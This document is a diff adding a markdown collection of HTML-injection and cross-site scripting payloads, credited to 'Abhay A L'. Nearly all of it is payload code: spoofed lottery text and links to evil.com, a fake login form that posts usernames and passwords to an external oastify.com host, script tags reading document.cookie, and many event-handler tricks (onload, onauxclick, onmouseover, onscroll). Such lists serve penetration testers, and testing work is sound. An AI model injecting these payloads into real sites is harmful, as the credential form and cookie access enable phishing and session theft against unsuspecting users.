@@ -1,0 +1,51 @@
+# HTML Payloads - Crafted by Abhay A L
+
+## 1. HTML Tag Manipulation
+<marquee>HTML INJECTION POC DONE BY ABHAY</marquee>
+<h1><font color="red">Visit Our New Website to gain the lottery</font></h1>
+<h3><mark><a href="https://cyberjerry.000webhostapp.com/hacked">e x a m p l e . c o m</a></mark></h3>
+<a href="//bf.am">Welcome</a>
+<a href="https://evil.com/">Click here</a>
+<input type="x">
+
+## 2. Form-Based Injection
+<div style="text-align: center;">
+  <form method="POST" action="http://g4ltote1op7p4qgq5dn2miupegk78ywn.oastify.com/">
+    <p>Phishing Page by Abhay:</p>
+    Username:<br> <input name="User"><br>
+    Password:<br> <input name="Password" type="password"><br><br>
+    <input name="Valid" value="Submit" type="submit">
+  </form>
+</div>
+
+## 3. JavaScript Injection
+<script>alert('This site is vulnerable - Abhay')</script>
+<h1>Hello,<script>alert('Abhay\'s Payload')</script>!</h1>
+<script src="data:text/html;base64,YWxlcnQoZG9jdW1lbnQuY29va2llKQ=="></script>
+<script src="data:text/html,alert(document.cookie)"></script>
+<script src="data:,alert(document.cookie)"></script>
+<script>alert(document.cookie)</script>
+
+## 4. Event Handlers
+<body onload="alert('Page Loaded - Abhay')">
+<body onpageshow="alert('Page Visible - Abhay')">
+<body onfocus="alert('Page Focused - Abhay')">
+<body onhashchange="alert('Hash Changed - Abhay')"><a href="#x">Click to trigger hash</a>
+<svg onload="alert('SVG Loaded - Abhay')"></svg>
+<svg height="1000" width="1000" onauxclick="confirm('Custom XSS Payload by Abhay')">
+  <circle cx="500" cy="500" r="400" stroke="black" stroke-width="3" fill="red" />
+</svg>
+<details onauxclick="prompt('Details Payload by Abhay')"></details>
+<marquee width="1000" onauxclick="alert('XSS by Abhay')">XSS</marquee>
+
+## 5. CSS and Obscure Payloads
+<h1 style="color:blue">Here</h1>
+<body style="overflow:auto;height:1000px;" onscroll="alert('Scrolling detected - Abhay')">
+<body onresize="alert('Window resized - Abhay')">Press F12!</body>
+<body onhelp="alert('Help key pressed - Abhay')">Press F1 (MSIE Only)</body>
+
+## 6. Customized Image & Links
+<img src="https://www.petmd.com/sites/default/files/Acute-Dog-Diarrhea-47066074.jpg" 
+     width="1000" height="750" 
+     alt="onmouseover=prompt('Image Payload by Abhay');" 
+     onmouseover="alert('Image Hover - Abhay')">
